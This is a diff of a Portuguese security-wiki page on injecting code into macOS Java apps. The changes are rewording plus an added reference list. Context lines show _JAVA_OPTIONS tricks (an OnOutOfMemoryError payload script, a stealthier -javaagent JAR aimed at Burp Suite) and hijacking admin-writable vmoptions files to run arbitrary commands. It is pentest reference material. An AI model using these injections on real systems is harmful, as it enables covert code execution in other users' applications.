@@ -4,7 +4,7 @@
 
 ## Enumeração
 
-Encontre aplicações Java instaladas no sistema. Foi observado que as aplicações Java no **Info.plist** conterão alguns parâmetros Java que contêm a string **`java.`**, então você pode pesquisá-la:
+Encontre as aplicações Java instaladas no seu sistema. Foi observado que as aplicações Java no **Info.plist** conterão alguns parâmetros Java que incluem a string **`java.`**, então você pode pesquisá-la:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-A variável de ambiente **`_JAVA_OPTIONS`** pode ser usada para injetar parâmetros arbitrários do Java na execução de um aplicativo compilado em Java:
+A variável de ambiente **`_JAVA_OPTIONS`** pode ser usada para injetar parâmetros arbitrários da VM Java quando um aplicativo Java é iniciado.<sup>[[1]](#references)</sup>
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Para executá-lo como um novo processo, e não como um processo filho do terminal atual, você pode usar:
+Para executá-lo como um novo processo e não como um processo filho do terminal atual, você pode usar:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-No entanto, isso acionará um erro no aplicativo executado; outra forma mais furtiva é criar um java agent e usar:
+No entanto, essa técnica aciona um erro no aplicativo em execução. Uma alternativa mais furtiva é criar um Java agent e usar `-javaagent`:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Criar o agente com uma **versão diferente do Java** da aplicação pode interromper a execução tanto do agente quanto da aplicação
+> Criar o agent com uma **versão diferente do Java** da aplicação pode causar o crash do agent e da aplicação.
 
-Onde o agente pode estar:
+Onde o agent pode estar:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-E então exporte a variável de ambiente e execute a aplicação Java assim:
+E então exporte a variável de ambiente e execute a aplicação Java da seguinte forma:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -125,12 +125,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## arquivo vmoptions
 
-Este arquivo permite especificar **parâmetros do Java** quando o Java é executado. Você poderia usar alguns dos truques anteriores para alterar os parâmetros do Java e **fazer o processo executar comandos arbitrários**.\
-Além disso, este arquivo também pode **incluir outros** com o diretório `include`, então você também poderia alterar um arquivo incluído.
+Este arquivo permite especificar **parâmetros do Java** quando o Java é executado. Você pode usar algumas das técnicas anteriores para alterar os parâmetros do Java e **fazer o processo executar comandos arbitrários**.\
+Além disso, este arquivo também pode **incluir outros arquivos** com a diretiva `include`, portanto, você também pode alterar um arquivo incluído.
 
-Além disso, alguns aplicativos Java **carregarão mais de um** arquivo `vmoptions`.
+Mais ainda, alguns apps Java **carregarão mais de um arquivo `vmoptions`**.
 
-Alguns aplicativos, como o Android Studio, indicam em sua **saída onde estão procurando** por esses arquivos, como:
+Alguns aplicativos, como o Android Studio, indicam em sua **saída onde procuram** esses arquivos:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Alguns aplicativos, como o Android Studio, indicam em sua **saída onde estão p
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Se não, você pode verificar isso facilmente com:
+Se não estiverem, você pode verificar isso com:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,11 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Observe como é interessante que o Android Studio, neste exemplo, esteja tentando carregar o arquivo **`/Applications/Android Studio.app.vmoptions`**, um local onde qualquer usuário do grupo **`admin`** tem acesso de escrita.
+Observe que o Android Studio, neste exemplo, tenta carregar **`/Applications/Android Studio.app.vmoptions`**, um local onde qualquer usuário do grupo **`admin` tem acesso de escrita**.
 
+## References
+
+- [1] [OpenJDK — análise de `_JAVA_OPTIONS` em `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
+- [2] [Oracle Java — especificação do pacote `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [3] [JetBrains — Configurando opções da JVM e propriedades da plataforma](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
 {{#include ../../../banners/hacktricks-training.md}}
